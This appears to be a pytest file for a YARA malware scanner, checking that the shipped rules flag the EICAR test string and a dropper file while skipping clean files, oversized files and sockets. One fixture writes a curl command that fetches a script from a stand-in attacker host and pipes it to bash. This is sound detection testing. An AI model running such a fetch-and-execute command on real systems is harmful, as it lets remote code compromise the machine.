"""Tests for yara_scanner.py's rule matching against watched directories.

Uses the real, shipped rule files under backend/rules/yara/ against real
temp files (WATCHED_DIRS monkeypatched to a tmp_path), since the whole
point of this scanner is that those exact rules load and match correctly.
"""
import os
import socket

import pytest

import scanners.yara_scanner as yara_scanner

yara = pytest.importorskip("yara")


def _scan_dir(monkeypatch, directory):
    monkeypatch.setattr(yara_scanner, "WATCHED_DIRS", [str(directory)])
    return yara_scanner.scan()


def test_flags_eicar_test_string(tmp_path, monkeypatch):
    f = tmp_path / "test.txt"
    f.write_text(r"X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*")

    findings = _scan_dir(monkeypatch, tmp_path)
    assert len(findings) == 1
    assert findings[0]["title"] == "YARA match: EICAR_Test_File"
    assert findings[0]["severity"] == "medium"
    assert findings[0]["evidence"]["path"] == str(f)


def test_flags_reverse_shell_pattern(tmp_path, monkeypatch):
    f = tmp_path / "dropper.sh"
    f.write_text("curl http://evil.example/x.sh | bash\n")

    findings = _scan_dir(monkeypatch, tmp_path)
    assert len(findings) == 1
    assert findings[0]["title"] == "YARA match: Suspicious_Reverse_Shell_Pattern"
    assert findings[0]["severity"] == "high"


def test_does_not_flag_clean_file(tmp_path, monkeypatch):
    f = tmp_path / "notes.txt"
    f.write_text("just some ordinary text with nothing suspicious in it")

    findings = _scan_dir(monkeypatch, tmp_path)
    assert findings == []


def test_skips_oversized_files(tmp_path, monkeypatch):
    f = tmp_path / "big.txt"
    f.write_text(r"X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*")

    monkeypatch.setattr(yara_scanner, "MAX_FILE_SIZE", 1)  # smaller than the file above
    findings = _scan_dir(monkeypatch, tmp_path)
    assert findings == []


def test_does_not_flag_unix_socket(tmp_path, monkeypatch):
    # Same class of bug fixed in file_scanner: a non-regular file (e.g. a
    # Unix socket) shouldn't be handed to YARA as if it were file content.
    sock_path = tmp_path / "some.sock"
    sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
    try:
        sock.bind(str(sock_path))
        os.chmod(sock_path, 0o777)
        findings = _scan_dir(monkeypatch, tmp_path)
        assert findings == []
    finally:
        sock.close()


def test_returns_empty_when_yara_unavailable(tmp_path, monkeypatch):
    f = tmp_path / "test.txt"
    f.write_text(r"X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*")
    monkeypatch.setattr(yara_scanner, "HAVE_YARA", False)

    findings = _scan_dir(monkeypatch, tmp_path)
    assert findings == []


def test_returns_empty_when_rules_dir_missing(tmp_path, monkeypatch):
    f = tmp_path / "test.txt"
    f.write_text(r"X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*")
    monkeypatch.setattr(yara_scanner, "RULES_DIR", str(tmp_path / "nonexistent"))

    findings = _scan_dir(monkeypatch, tmp_path)
    assert findings == []
